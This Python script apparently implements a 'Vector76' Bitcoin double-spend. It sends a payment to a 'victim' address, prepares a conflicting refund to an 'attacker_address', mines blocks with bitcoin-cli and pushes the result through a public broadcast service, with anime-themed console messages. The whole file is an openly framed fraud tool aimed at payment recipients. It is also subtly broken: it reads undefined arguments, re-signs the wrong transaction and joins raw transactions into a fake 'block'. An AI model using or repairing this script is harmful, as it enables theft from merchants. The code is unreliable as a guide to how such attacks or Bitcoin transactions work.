import argparse
import time
import requests
import subprocess
import cryptos
import hashlib
import uuid
import json
import subprocess


from bitcoinrpc.authproxy import AuthServiceProxy


from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description="How To Use vector76")

parser.add_argument("from_wifkey",
                    help="Fake send btc from wif key.",
                    type=str)
parser.add_argument("send_to",
                    help="Fake send btc to address.",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                    type=float)
parser.add_argument("--is_testnet",
                    "-test",
                    help="Testnet flag (Default=True)",
                    default=True,
                    type=bool)

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def generate_block(address, block, submit=False):
    subprocess.run(['bitcoin-cli', "generateblock", address, f"['{block}']", str(submit).lower()],
                             capture_output=True, 
                             text=True,
                             check=True)

def send_rawtransaction(hextx):
    result = subprocess.run(['bitcoin-cli', "sendrawtransaction", hextx],
                             capture_output=True, 
                             text=True,
                             check=True)
    return result.stdout

def broadcast_transaction(raw_tx, testnet):

    url = "https://live.blockcypher.com/btc/pushtx"
    res = requests.get(url).text
    bs = BeautifulSoup(res, 'html.parser')
    csrf_token = bs.find(attrs={'name':'csrfmiddlewaretoken'}).get('value')
    print(csrf_token)
    if testnet:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = raw_tx
        payload = {"tx_hex": raw_tx,
               "coin_symbol": "btc-testnet",
               "csrfmiddlewaretoken": csrf_token}
    else:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = {"tx_hex": raw_tx,
               "coin_symbol": "btc",
               "csrfmiddlewaretoken": csrf_token}

    response = requests.post(url,
                             allow_redirects=True,
                             data=payload,
                             headers=headers)
    print(f"response url : {response.url}")
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")



args = parser.parse_args()
fake_send_from   = args.send_from_wifkey
victim_address   = args.send_to
attacker_address = args.attacker_address
amount_btc = args.amount_of_coins
testnet    = args.is_testnet
loop_count = args.loop_count

if loop_count <= 0:
    loop_count = 1

transaction_util = cryptos.Bitcoin(testnet=testnet)
print("OK")
balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
inputs  = transaction_util.get_unspents(transaction_util.wiftoaddr(fake_send_from))
print(inputs)
if balance["confirmed"] <= 0:
    balance = balance["unconfirmed"]
else:
    balance = balance["confirmed"]


send_amount = to_satoshi(amount_btc)

if balance < send_amount:
    print(f"[!] insufficient funds. ")
    exit()

fee = 15000
change_btc_amt = (balance - send_amount) - fee#おつり



if testnet:
    tx_victim   = [{"address": victim_address, "value": send_amount}]
    tx_attacker = [{"address": attacker_address, "value": send_amount}]
else:
    tx_victim   = [{"address": victim_address, "value": send_amount}]

tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
print(tx_victim)
if testnet:
    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
    tx_attacker = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
else:
    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
    tx_attacker = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))

vector76_block = f"{tx_victim}{tx_attacker}"

print(f"Generating Vector76 Block")
send_rawtransaction(vector76_block)
for i in range(6):
    print(f" {i + 1} / 6   ...")
    generate_block(attacker_address, vector76_block)

print("[+] READY...")
print()
print()
print("--------------------")
print(f"Send to                       : {victim_address}")
print(f"Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Signed victim   Signed RawTx  : {tx_victim}")
print(f"Signed attacker Signed RawTx  : {tx_attacker}")
print(f"Signed vector76 Signed RawTx  : {vector76_block}")
print(f"Testnet Mode              : {testnet}")
print("--------------------")
print()
print()
input("--- Are you sure you want to continue? Press Enter to continue. ---")
print()

print("Sending V1 Transaction to victim...")
transaction_util.pushtx(tx_victim)
print()
print("OK")
print()
input("--- Send the vector76 lock after pressing the enter key. --- ")
print()
print()
print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
print()
time.sleep(1) #..... -u-

print("MNG IBLK SND TOBC  (不正なブロックを、ブロックチェーンに送信!)")
print()
transaction_util.pushtx(vector76_block)
print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()
sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)
time.sleep(1) #休ませる

print("----------------")
print("Done.")